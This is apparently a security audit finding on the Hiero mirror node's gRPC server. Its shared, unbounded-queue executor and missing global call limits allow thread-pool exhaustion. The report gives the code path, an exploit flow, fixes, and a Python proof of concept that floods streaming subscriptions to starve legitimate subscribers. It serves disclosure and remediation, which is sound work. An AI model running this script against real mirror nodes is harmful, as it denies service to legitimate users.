### Title
Thread Pool Exhaustion via Unbounded gRPC Streaming Subscriptions on Shared `applicationTaskExecutor`

### Summary
`GrpcConfiguration.grpcServerConfigurer()` assigns Spring Boot's shared `applicationTaskExecutor` as the gRPC server's executor with no global cap on concurrent calls or connections. An unauthenticated attacker can open an unbounded number of connections, each holding up to 5 long-lived streaming subscriptions, exhausting the executor's core thread pool (8 threads by default) and causing all subsequent legitimate gRPC calls — including gossip message forwarding — to queue indefinitely.

### Finding Description

**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
serverBuilder.executor(applicationTaskExecutor);                          // line 32
serverBuilder.maxConcurrentCallsPerConnection(                            // line 33
    nettyProperties.getMaxConcurrentCallsPerConnection());                // line 33
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause and failed assumption:**

The code sets `maxConcurrentCallsPerConnection = 5`, which limits calls *per connection*, but imposes **no limit on the total number of connections** and **no global cap on concurrent calls across all connections**. The `applicationTaskExecutor` injected here is Spring Boot's auto-configured `ThreadPoolTaskExecutor` with default settings:
- `corePoolSize` = 8
- `maxPoolSize` = `Integer.MAX_VALUE`
- `queueCapacity` = `Integer.MAX_VALUE` (unbounded queue)

Because the queue is unbounded, the executor never creates threads beyond the core pool size of 8. Once all 8 core threads are occupied by long-running streaming subscriptions, every subsequent task (including gossip forwarding) is silently enqueued and starved.

**Exploit flow:**

1. Attacker opens 2+ TCP connections to the gRPC port (default 5600) with no authentication.
2. On each connection, attacker initiates 5 concurrent long-lived streaming subscription RPCs (e.g., `subscribeTopic`), holding each thread in the executor for the stream's lifetime.
3. With 2 connections × 5 streams = 10 concurrent streams, all 8 core threads are occupied (the remaining 2 queue up, consuming the first available threads as they free).
4. Any legitimate subscriber's RPC call is submitted to the executor queue and never dequeued while attacker streams remain open.
5. Gossip message forwarding to legitimate subscribers is blocked indefinitely.

**Why existing checks fail:**

`maxConcurrentCallsPerConnection = 5` is a *per-connection* guard only. There is no:
- Per-IP connection limit
- Global `maxConcurrentCalls` limit on the `NettyServerBuilder`
- Rate limiting or authentication on the gRPC endpoint
- Separate dedicated executor for gossip/internal traffic vs. external subscriber traffic [1](#0-0) [2](#0-1) 

### Impact Explanation
All gRPC traffic — including gossip message forwarding to legitimate subscribers — shares the same bounded core thread pool. A successful attack causes complete denial of service for all legitimate gRPC consumers. Because the `applicationTaskExecutor` is also used by other Spring async operations in the same JVM, the impact can extend beyond gRPC to other internal async tasks. Severity: **High** (availability loss for a core protocol function).

### Likelihood Explanation
The gRPC port is publicly reachable with no authentication, no per-IP connection limit, and no rate limiting. An attacker needs only a script that opens a handful of TCP connections and initiates 5 streaming RPCs per connection — well within the capability of any unprivileged user with network access. The attack is trivially repeatable and requires no special knowledge beyond the public gRPC API schema. Likelihood: **High**.

### Recommendation

1. **Set a global concurrent call cap** on the `NettyServerBuilder`:
   ```java
   serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
   // Add:
   serverBuilder.maxConnectionAge(30, TimeUnit.SECONDS);
   serverBuilder.maxConnectionIdle(10, TimeUnit.SECONDS);
   ```
   And add a `maxConcurrentCalls` property to `NettyProperties` to cap total concurrent calls globally.

2. **Use a dedicated, bounded executor** for gRPC instead of the shared `applicationTaskExecutor`:
   ```java
   Executor grpcExecutor = new ThreadPoolExecutor(
       coreSize, maxSize, keepAlive, TimeUnit.SECONDS,
       new LinkedBlockingQueue<>(boundedQueueCapacity),
       new ThreadPoolExecutor.CallerRunsPolicy());
   serverBuilder.executor(grpcExecutor);
   ```

3. **Add per-IP connection limiting** at the load balancer or via a Netty `ChannelHandler`.

4. **Require authentication** (mTLS or token) for streaming subscription RPCs.

### Proof of Concept

```python
import grpc
import threading
# Assumes proto stubs are generated from the mirror node proto files

def flood_connection(_):
    channel = grpc.insecure_channel("mirror-node-host:5600")
    stub = ConsensusServiceStub(channel)
    request = ConsensusTopicQuery(topic_id=TopicID(topic_num=1))
    # Open 5 concurrent streams per connection (maxConcurrentCallsPerConnection default)
    streams = [stub.subscribeTopic(request) for _ in range(5)]
    for s in streams:
        try:
            for _ in s:  # block thread consuming stream indefinitely
                pass
        except Exception:
            pass

# Open 4 connections × 5 streams = 20 concurrent streams → exhausts 8 core threads
threads = [threading.Thread(target=flood_connection, args=(i,)) for i in range(4)]
for t in threads:
    t.start()

# Now attempt a legitimate subscription — it will queue indefinitely and never be served
legit_channel = grpc.insecure_channel("mirror-node-host:5600")
legit_stub = ConsensusServiceStub(legit_channel)
# This call hangs — gossip messages are never forwarded to this subscriber
for msg in legit_stub.subscribeTopic(ConsensusTopicQuery(topic_id=TopicID(topic_num=1))):
    print(msg)  # Never reached
```
